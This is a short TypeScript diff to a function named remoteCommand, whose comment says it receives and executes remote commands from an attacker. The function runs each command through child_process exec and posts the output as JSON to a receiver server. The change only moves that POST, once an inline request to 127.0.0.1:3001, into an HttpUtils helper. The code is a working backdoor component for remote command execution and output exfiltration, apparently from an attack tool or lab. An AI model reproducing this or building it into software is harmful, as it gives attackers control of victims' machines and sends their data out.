@@ -1,5 +1,5 @@
 import { exec } from 'child_process';
-import http, { RequestOptions } from 'http';
+import HttpUtils from './http';
 
 /**
  * Receive and execute the remote command from the attacker
@@ -19,19 +19,10 @@ export const remoteCommand = (pwd: string, cmd: string) => {
         data: stdout,
       });
       // Init request to receiver server
-      const options: RequestOptions = {
-        host: '127.0.0.1',
-        port: '3001',
-        path: '/',
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Content-Length': Buffer.byteLength(data),
-        },
-      };
-      const req = http.request(options);
-      req.write(data);
-      req.end();
+      HttpUtils.post('/', data, {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(data),
+      });
     });
   }
 };
